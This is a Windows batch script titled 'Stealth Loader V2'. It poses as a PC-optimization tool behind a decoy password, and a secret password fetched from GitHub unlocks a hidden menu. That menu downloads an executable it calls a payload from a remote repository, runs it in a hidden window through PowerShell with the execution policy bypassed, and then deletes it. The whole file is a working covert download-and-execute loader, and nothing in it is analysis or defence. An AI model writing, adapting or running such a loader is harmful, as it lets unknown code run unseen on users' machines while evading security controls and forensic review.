@echo off
setlocal enabledelayedexpansion

:LOGIN
cls
echo ==========================================
echo           STEALTH LOADER V2
echo ==========================================
echo.
set /p "userpass=Enter Password: "

:: Check password '1' for PC Optimization
if "%userpass%"=="1" (
    echo Launching PC Optimization Menu...
    timeout /t 2 >nul
    goto :EOF
)

:: Check secret password from GitHub
echo Verifying secret password...
curl -s -o "%temp%\remote_pass.txt" "https://raw.githubusercontent.com/maxyprime/stealthloaderv2/refs/heads/main/password.txt"
set /p secret=<"%temp%\remote_pass.txt"
del "%temp%\remote_pass.txt" >nul 2>&1

if /i "%userpass%"=="%secret%" (
    goto :STEALTH_MENU
) else (
    echo Incorrect password. Try again.
    timeout /t 2 >nul
    goto :LOGIN
)

:STEALTH_MENU
cls
echo.
echo ========== STEALTH MENU ==========
echo 1. Setup
echo 2. Run
echo 3. Bypass
echo 4. Exit
echo ==================================
set /p "choice=Choose an option: "

if "%choice%"=="1" goto :SETUP
if "%choice%"=="2" goto :RUN
if "%choice%"=="3" goto :BYPASS
if "%choice%"=="4" exit

echo Invalid choice.
timeout /t 2 >nul
goto :STEALTH_MENU

:SETUP
cls
echo ==========================================
echo         *** STEALTH MENU - SETUP ***
echo ------------------------------------------
echo [*] Initializing setup process...
timeout /t 1 >nul

echo [1/4] Preparing environment...
timeout /t 1 >nul

echo [2/4] Connecting to GitHub repository...
timeout /t 1 >nul

echo [3/4] Downloading payload: CAXVN.exe
curl -# -L -o "%temp%\CAXVN.exe" "https://github.com/maxyprime/stealthloaderv2/raw/main/CAXVN.exe"

if exist "%temp%\CAXVN.exe" (
    echo [✓] Download complete.
    echo [4/4] Verifying and finalizing setup...
    timeout /t 1 >nul
    echo [✓] CAXVN.exe is ready in temp directory.
    echo ------------------------------------------
    echo [✔] Setup completed successfully.
) else (
    echo [✖] ERROR: Download failed.
    echo [!] Check your internet connection or GitHub link.
    echo ------------------------------------------
    pause
    goto STEALTH_MENU
)

echo ------------------------------------------
pause
goto STEALTH_MENU



:RUN
cls
echo [*] Preparing to launch CAXVN.exe...

set "EXE_PATH=%temp%\CAXVN.exe"

if not exist "%EXE_PATH%" (
    echo [✖] EXE not found. Please run Setup first.
    pause
    goto STEALTH_MENU
)

echo [*] Running silently...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
 "Start-Process -FilePath '%EXE_PATH%' -WindowStyle Hidden -Wait"

echo [✓] EXE has exited. Cleaning up...
del /f /q "%EXE_PATH%" >nul 2>&1
echo [✓] Cleanup complete.
pause
goto STEALTH_MENU


:BYPASS
echo Cleaning up...
del /f /q "%TEMP_EXE%" >nul 2>&1
echo Done.
pause
goto :STEALTH_MENU

